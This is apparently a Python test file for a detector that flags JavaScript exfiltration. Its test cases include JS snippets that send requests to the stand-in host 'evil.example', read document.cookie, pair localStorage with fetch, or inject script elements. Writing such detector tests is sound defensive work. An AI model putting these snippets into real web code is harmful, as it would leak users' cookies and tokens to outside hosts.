"""Out-def-48 JS exfiltration tests."""

import importlib.util
import sys
from pathlib import Path

RUNTIME = Path(__file__).resolve().parent.parent


def _load(name):
    spec = importlib.util.spec_from_file_location(name, RUNTIME / f"{name}.py")
    module = importlib.util.module_from_spec(spec)
    sys.modules[name] = module
    spec.loader.exec_module(module)
    return module


d48 = _load("out_def_48")


def test_network_sinks_detected():
    cases = [
        'fetch("https://evil.example/x");',
        'var r = new XMLHttpRequest(); r.open("GET", "http://evil.example/x");',
        '$.ajax({url: "https://evil.example/x"});',
        'navigator.sendBeacon("https://evil.example/x", d);',
        'var s = new WebSocket("wss://evil.example/x");',
        'var e = new EventSource("//evil.example/x");',
    ]
    for js in cases:
        found, _, evidence = d48.detect_js_exfil(js)
        assert found is True, js
        assert evidence


def test_cookie_read_detected():
    found, _, evidence = d48.detect_js_exfil("var c = document.cookie;")
    assert found is True
    assert evidence


def test_storage_fetch_combo_detected():
    found, _, evidence = d48.detect_js_exfil(
        'var t = localStorage.getItem("tok"); fetch("/api/local", {body: t});'
    )
    assert found is True
    assert any(e["pattern"] == "storage+fetch exfil combo" for e in evidence)


def test_script_injection_detected():
    found, _, _ = d48.detect_js_exfil(
        "var s = document.createElement('script'); s.src = u;"
    )
    assert found is True


def test_clean_js_passes():
    found, reason, evidence = d48.detect_js_exfil(
        "function add(a, b) { return a + b; }\n"
        "console.log(add(2, 3));\n"
        'fetch("/api/local").then(r => r.json());'
    )
    assert found is False, reason
    assert evidence == []


def test_fail_closed_on_bad_input():
    try:
        d48.detect_js_exfil(None)
    except d48.OutDef48Error:
        pass
    else:
        raise AssertionError("expected OutDef48Error")


def test_stdlib_only():
    assert d48.stdlib_only() is True


def test_version_pin():
    assert d48.OUT_DEF_48_VERSION == "out-def-48.v1"
    assert d48.SCHEMA_PIN == "northstar.out-def-48.v1"
